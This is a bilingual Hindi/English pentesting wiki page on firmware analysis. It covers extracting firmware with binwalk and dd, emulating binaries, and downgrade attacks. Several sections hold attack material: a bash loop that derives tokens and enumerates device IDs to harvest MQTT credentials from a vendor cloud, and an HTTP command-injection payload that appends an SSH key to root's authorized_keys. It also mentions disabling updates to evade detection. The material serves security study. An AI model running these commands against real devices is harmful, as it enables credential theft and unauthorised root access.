# Firmware विश्लेषण

{{#include ../../banners/hacktricks-training.md}}

## **परिचय**

### संबंधित संसाधन


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

Firmware एक आवश्यक सॉफ़्टवेयर है जो उपकरणों को सही ढंग से काम करने के लिए सक्षम बनाता है — यह hardware components और यूज़र द्वारा उपयोग किए जाने वाले software के बीच संचार को प्रबंधित और सुविधाजनक बनाता है। यह permanent memory में संग्रहीत रहता है, जिससे डिवाइस को पावर ऑन होते ही आवश्यक निर्देश मिलते हैं और अंततः operating system लॉन्च होता है। Firmware की जाँच और संभावित रूप से संशोधन करना security vulnerabilities की पहचान करने में एक महत्वपूर्ण कदम है।

## **जानकारी एकत्र करना**

**जानकारी एकत्र करना** किसी डिवाइस की संरचना और उस में उपयोग की जाने वाली तकनीकों को समझने के लिए एक महत्वपूर्ण प्रारम्भिक चरण है। इस प्रक्रिया में निम्नलिखित का डेटा इकट्ठा करना शामिल है:

- CPU architecture और वह कौन सा operating system चलाता है
- Bootloader की विशेष जानकारी
- Hardware layout और datasheets
- Codebase metrics और source locations
- External libraries और license types
- Update histories और regulatory certifications
- Architectural और flow diagrams
- Security assessments और पहचानी गई vulnerabilities

इस उद्देश्य के लिए, **OSINT** tools अत्यंत उपयोगी हैं, साथ ही उपलब्ध open-source software components का मैन्युअल और स्वचालित तरीके से विश्लेषण भी करना चाहिए। Tools जैसे [Coverity Scan](https://scan.coverity.com) और [Semmle’s LGTM](https://lgtm.com/#explore) मुफ्त static analysis प्रदान करते हैं जिनका उपयोग संभावित समस्याओं को खोजने के लिए किया जा सकता है।

## **Firmware प्राप्त करना**

Firmware प्राप्त करने के कई तरीके होते हैं, जिनमें से प्रत्येक की जटिलता अलग होती है:

- **Directly** स्रोत से (developers, manufacturers)
- दिए गए निर्देशों से **build** करके
- आधिकारिक support sites से **download** करके
- होस्ट किए गए firmware files खोजने के लिए **Google dork** queries का उपयोग
- सीधे **cloud storage** तक पहुंच, जैसे [S3Scanner](https://github.com/sa7mon/S3Scanner) जैसे tools के साथ
- **updates** को man-in-the-middle तकनीकों द्वारा intercept करना
- **extract** करना उपकरण से कनेक्शनों के माध्यम से जैसे **UART**, **JTAG**, या **PICit**
- डिवाइस संचार के भीतर update requests को **sniff** करना
- hardcoded update endpoints की पहचान और उपयोग करना
- bootloader या network से **dump** करना
- जब सभी रास्ते असफल हों तो storage chip को निकालकर पढ़ना, उपयुक्त hardware tools का उपयोग करते हुए

## Firmware का विश्लेषण

अब जब आपके पास firmware है, तो आपको इसके बारे में जानकारी निकालनी होगी ताकि यह पता चल सके कि इसे कैसे ट्रीट करना है। इसके लिए आप विभिन्न tools उपयोग कर सकते हैं:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
यदि आपको उन टूल्स से ज्यादा कुछ नहीं मिलता है तो इमेज की **entropy** `binwalk -E <bin>` से चेक करें — अगर entropy कम है तो यह संभवतः encrypted नहीं है। अगर entropy अधिक है तो यह संभवतः encrypted (या किसी तरह compressed) है।

इसके अलावा, आप इन टूल्स का उपयोग करके **फर्मवेयर के अंदर एम्बेडेड फ़ाइलें** extract कर सकते हैं:

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Or [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) to inspect the file.

### फ़ाइल सिस्टम प्राप्त करना

पिछले बताए गए टूल्स जैसे `binwalk -ev <bin>` के साथ आपको **extract the filesystem** करने में सक्षम होना चाहिए।\
Binwalk आमतौर पर इसे एक **folder named as the filesystem type** के अंदर extract करता है, जो आमतौर पर निम्न में से एक होता है: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### मैनुअल फ़ाइल सिस्टम एक्सट्रैक्शन

कभी-कभी, binwalk के signatures में filesystem का **magic byte** नहीं होता है। ऐसे मामलों में, binwalk का उपयोग करके **filesystem का offset ढूंढें और binary से compressed filesystem को carve करें** और नीचे दिए गए चरणों का पालन करके उसके प्रकार के अनुसार **manually extract** करें।
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
नीचे दिया गया **dd command** चलाएँ carving the Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
वैकल्पिक रूप से, निम्नलिखित कमांड भी चलाया जा सकता है।

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- For squashfs (उपरोक्त उदाहरण में उपयोग किया गया)

`$ unsquashfs dir.squashfs`

फाइलें बाद में `squashfs-root` डायरेक्टरी में मिलेंगी।

- CPIO आर्काइव फ़ाइलें

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 फ़ाइल सिस्टम के लिए

`$ jefferson rootfsfile.jffs2`

- NAND flash वाले ubifs फ़ाइल सिस्टम के लिए

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## फ़र्मवेयर का विश्लेषण

एक बार firmware प्राप्त हो जाने पर, इसकी संरचना और संभावित vulnerabilities को समझने के लिए इसे विस्तार से विश्लेषित करना आवश्यक है। यह प्रक्रिया firmware image से मूल्यवान डेटा निकालने और विश्लेषण करने के लिए विभिन्न tools के उपयोग में शामिल है।

### प्रारम्भिक विश्लेषण उपकरण

बाइनरी फ़ाइल (जिसे `<bin>` कहा गया है) की प्रारंभिक जाँच के लिए कुछ commands दिए गए हैं। ये commands file types की पहचान करने, strings निकालने, binary डेटा का विश्लेषण करने, और partition तथा filesystem विवरण समझने में मदद करते हैं:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
इमेज के encryption स्थिति का आकलन करने के लिए, **entropy** को `binwalk -E <bin>` से चेक किया जाता है। कम entropy encryption की कमी का सुझाव देती है, जबकि उच्च entropy संभावित encryption या compression को इंगित करती है।

एमबेडेड फ़ाइलें निकालने के लिए, जैसे **file-data-carving-recovery-tools** documentation और **binvis.io** (file inspection के लिए) जैसे tools और resources की सिफारिश की जाती है।

### फ़ाइल सिस्टम निकालना

`binwalk -ev <bin>` का उपयोग करके, आम तौर पर आप filesystem को extract कर सकते हैं, अक्सर filesystem प्रकार के नाम पर एक directory में (उदा., squashfs, ubifs)। हालांकि, जब **binwalk** missing magic bytes के कारण filesystem type को पहचानने में विफल होता है, तो manual extraction आवश्यक होता है। इसमें filesystem के offset का पता लगाने के लिए `binwalk` का उपयोग करना शामिल है, जिसके बाद `dd` कमांड का उपयोग करके filesystem को carve out किया जाता है:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
उसके बाद, filesystem के टाइप के अनुसार (उदा., squashfs, cpio, jffs2, ubifs), मैन्युअली कंटेंट निकालने के लिए अलग-अलग commands इस्तेमाल किए जाते हैं।

### Filesystem Analysis

Filesystem निकालने के बाद security flaws की खोज शुरू होती है। ध्यान insecure network daemons, hardcoded credentials, API endpoints, update server functionalitites, uncompiled code, startup scripts, और compiled binaries की offline analysis पर दिया जाता है।

**Key locations** और **items** जिनकी जांच करनी चाहिए, उनमें शामिल हैं:

- **etc/shadow** और **etc/passwd** — user credentials के लिए
- SSL certificates और keys **etc/ssl** में
- संभावित कमजोरियों के लिए configuration और script फाइलें
- आगे के विश्लेषण के लिए embedded binaries
- आम IoT device web servers और binaries

कुछ tools filesystem के भीतर sensitive जानकारी और vulnerabilities खोजने में मदद करते हैं:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) और [**Firmwalker**](https://github.com/craigz28/firmwalker) sensitive information search के लिए
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) व्यापक firmware analysis के लिए
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), और [**EMBA**](https://github.com/e-m-b-a/emba) static और dynamic analysis के लिए

### Security Checks on Compiled Binaries

Filesystem में मिले source code और compiled binaries दोनों की vulnerabilities के लिए जाँच करनी चाहिए। Unix binaries के लिए **checksec.sh** और Windows binaries के लिए **PESecurity** जैसे tools उन unprotected binaries की पहचान करने में मदद करते हैं जिन्हें exploit किया जा सकता है।

## Harvesting cloud config and MQTT credentials via derived URL tokens

कई IoT hubs अपने per-device configuration को ऐसे cloud endpoint से लेते हैं:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Firmware analysis के दौरान आप पा सकते हैं कि <token> device ID से locally एक hardcoded secret का उपयोग करके derive किया गया है, उदाहरण के लिए:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

यह डिज़ाइन किसी भी व्यक्ति को जो deviceId और STATIC_KEY जानता है, URL पुनर्निर्माण करने और cloud config खींचने में सक्षम बनाता है, जो अक्सर plaintext MQTT credentials और topic prefixes उजागर कर देता है।

Practical workflow:

1) UART boot logs से deviceId निकालें

- एक 3.3V UART adapter (TX/RX/GND) कनेक्ट करें और logs capture करें:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- उन लाइनों की तलाश करें जो cloud config URL pattern और broker address प्रिंट कर रही हों, उदाहरण के लिए:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) फ़र्मवेयर से STATIC_KEY और token एल्गोरिथ्म पुनर्प्राप्त करें

- बाइनरीज़ को Ghidra/radare2 में लोड करें और config path ("/pf/") या MD5 उपयोग की तलाश करें।
- एल्गोरिथ्म की पुष्टि करें (उदाहरण के लिए, MD5(deviceId||STATIC_KEY)).
- Bash में token व्युत्पन्न करें और digest को uppercase करें:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) cloud config और MQTT credentials प्राप्त करें

- URL बनाकर curl से JSON प्राप्त करें; jq से parse करके secrets निकालें:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) plaintext MQTT और कमजोर topic ACLs (यदि मौजूद हों) का दुरुपयोग करें

- Recovered credentials का उपयोग करके maintenance topics को subscribe करें और संवेदनशील events की तलाश करें:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) अनुमानित device IDs को सूचीबद्ध करें (बड़े पैमाने पर, अनुमति के साथ)

- कई ecosystems में vendor OUI/product/type bytes एम्बेड होते हैं, जिनके बाद एक क्रमिक suffix आता है।
- आप candidate IDs को iterate कर सकते हैं, tokens प्राप्त कर सकते हैं और configs को प्रोग्रामेटिक रूप से fetch कर सकते हैं:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notes
- mass enumeration का प्रयास करने से पहले हमेशा स्पष्ट अनुमति प्राप्त करें।
- यदि संभव हो तो target hardware को संशोधित किए बिना secrets recover करने के लिए emulation या static analysis को प्राथमिकता दें।

The process of emulating firmware enables **dynamic analysis** either of a device's operation or an individual program. This approach can encounter challenges with hardware or architecture dependencies, but transferring the root filesystem or specific binaries to a device with matching architecture and endianness, such as a Raspberry Pi, or to a pre-built virtual machine, can facilitate further testing.

### Emulating Individual Binaries

एकल प्रोग्राम की जाँच के लिए, प्रोग्राम की endianness और CPU architecture की पहचान करना आवश्यक है।

#### MIPS Architecture के साथ उदाहरण

MIPS architecture binary को emulate करने के लिए, निम्न command का उपयोग किया जा सकता है:
```bash
file ./squashfs-root/bin/busybox
```
और आवश्यक इम्यूलेशन टूल्स स्थापित करने के लिए:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` का उपयोग किया जाता है, और little-endian बाइनरीज़ के लिए `qemu-mipsel` चुना जाता है।

#### ARM Architecture Emulation

ARM बाइनरीज़ के लिए प्रक्रिया समान होती है, जहाँ इम्यूलेशन के लिए `qemu-arm` emulator का उपयोग किया जाता है।

### Full System Emulation

Tools जैसे [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), और अन्य full firmware emulation को सरल बनाते हैं, प्रक्रियाओं को ऑटोमेट करते हैं और dynamic analysis में मदद करते हैं।

## Dynamic Analysis in Practice

इस चरण में, विश्लेषण के लिए या तो वास्तविक डिवाइस या emulated डिवाइस वातावरण उपयोग किया जाता है। OS और filesystem तक shell access बनाए रखना आवश्यक है। Emulation हार्डवेयर इंटरैक्शंस को पूरी तरह नकल न कर सके, इसलिए कभी-कभी emulation को रीस्टार्ट करना पड़ सकता है। विश्लेषण के दौरान filesystem को फिर से जांचें, exposed webpages और network services का exploit करें, और bootloader कमजोरियों का पता लगाएँ। Firmware integrity tests महत्वपूर्ण हैं ताकि संभावित backdoor कमजोरियाँ पहचानी जा सकें।

## Runtime Analysis Techniques

Runtime analysis में किसी process या binary के ऑपरेटिंग वातावरण में इंटरैक्ट करना शामिल है, और इसके लिए gdb-multiarch, Frida, और Ghidra जैसे tools का उपयोग किया जाता है ताकि breakpoints सेट किए जा सकें और fuzzing और अन्य तकनीकों के माध्यम से कमजोरियाँ पहचानी जा सकें।

## Binary Exploitation and Proof-of-Concept

पहचानी गई कमजोरियों के लिए PoC विकसित करने के लिए target architecture की गहरी समझ और low-level भाषाओं में प्रोग्रामिंग आवश्यक होती है। Embedded systems में binary runtime protections दुर्लभ होते हैं, लेकिन जब मौजूद हों, तो Return Oriented Programming (ROP) जैसी techniques की आवश्यकता पड़ सकती है।

## Prepared Operating Systems for Firmware Analysis

Operating systems जैसे [AttifyOS](https://github.com/adi0x90/attifyos) और [EmbedOS](https://github.com/scriptingxss/EmbedOS) pre-configured वातावरण प्रदान करते हैं firmware security testing के लिए, जो आवश्यक tools से लैस होते हैं।

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS एक distro है जिसका उद्देश्य आपको Internet of Things (IoT) devices की security assessment और penetration testing करने में मदद करना है। यह एक pre-configured environment प्रदान करके बहुत सारा समय बचाता है और सभी आवश्यक tools पहले से लोड किए होते हैं।
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system जो Ubuntu 18.04 पर आधारित है और firmware security testing tools के साथ preloaded आता है।

## Firmware Downgrade Attacks & Insecure Update Mechanisms

हालाँकि कोई vendor firmware images के लिए cryptographic signature checks लागू कर सकता है, फिर भी **version rollback (downgrade) protection अक्सर छोड़ी जाती है**। जब boot- या recovery-loader केवल embedded public key के साथ signature को verify करता है लेकिन फ्लैश किए जा रहे image के *version* (या monotonic counter) की तुलना नहीं करता, तो attacker वैध तरीके से एक **पुराना, vulnerable firmware इंस्टॉल कर सकता है जिस पर अभी भी एक valid signature हो** और इस प्रकार patched vulnerabilities को फिर से वापस ला सकता है।

Typical attack workflow:

1. **Obtain an older signed image**
* इसे vendor के public download portal, CDN या support site से प्राप्त करें।
* इसे companion mobile/desktop applications से extract करें (उदा. एक Android APK के अंदर `assets/firmware/` के तहत)।
* इसे third-party repositories जैसे VirusTotal, Internet archives, forums, आदि से प्राप्त करें।
2. **Upload or serve the image to the device** किसी भी exposed update channel के माध्यम से:
* Web UI, mobile-app API, USB, TFTP, MQTT, आदि।
* कई consumer IoT devices *unauthenticated* HTTP(S) endpoints expose करते हैं जो Base64-encoded firmware blobs स्वीकार करते हैं, उन्हें server-side decode करते हैं और recovery/upgrade को trigger करते हैं।
3. Downgrade के बाद, उस vulnerability का exploit करें जिसे नए release में patch किया गया था (उदा. बाद में जोड़ा गया एक command-injection filter)।
4. वैकल्पिक रूप से latest image वापस flash करें या updates को disable कर दें ताकि एक बार persistence मिल जाने पर detection से बचा जा सके।

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
कमज़ोर (downgraded) फ़र्मवेयर में, `md5` पैरामीटर को sanitisation के बिना सीधे एक shell कमांड में जोड़ दिया जाता है, जिससे arbitrary कमांड्स का injection संभव हो जाता है (यहाँ – SSH key-based root access सक्षम करना)। बाद के फ़र्मवेयर वर्ज़न्स में एक बुनियादी character filter जोड़ा गया था, लेकिन downgrade protection की अनुपस्थिति इस फ़िक्स को बेअसर कर देती है।

### मोबाइल ऐप्स से Firmware निकालना

कई vendors अपने companion मोबाइल ऐप्लिकेशन्स में पूरे firmware images को बंडल करते हैं ताकि ऐप डिवाइस को Bluetooth/Wi‑Fi के जरिए अपडेट कर सके। ये पैकेज सामान्यतः बिना एन्क्रिप्शन के APK/APEX के अंदर `assets/fw/` या `res/raw/` जैसे paths में स्टोर होते हैं। `apktool`, `ghidra` या साधारण `unzip` जैसे टूल्स आपको physical hardware को छुए बिना signed images निकालने की अनुमति देते हैं।
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### अपडेट लॉजिक का मूल्यांकन करने के लिए चेकलिस्ट

* क्या *update endpoint* का transport/authentication पर्याप्त रूप से सुरक्षित है (TLS + authentication)?
* क्या डिवाइस flashing से पहले **version numbers** या **monotonic anti-rollback counter** की तुलना करता है?
* क्या image को secure boot chain के भीतर सत्यापित किया जाता है (उदा. signatures checked by ROM code)?
* क्या userland code अतिरिक्त sanity checks करता है (उदा. allowed partition map, model number)?
* क्या *partial* या *backup* update flows वही validation logic पुनः उपयोग कर रहे हैं?

> 💡  यदि ऊपर में से कोई भी मौजूद नहीं है, तो प्लेटफ़ॉर्म संभवतः rollback attacks के प्रति संवेदनशील है।

## अभ्यास के लिए कमजोर firmware

To practice discovering vulnerabilities in firmware, use the following vulnerable firmware projects as a starting point.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## संदर्भ

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## प्रशिक्षण और प्रमाणपत्र

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
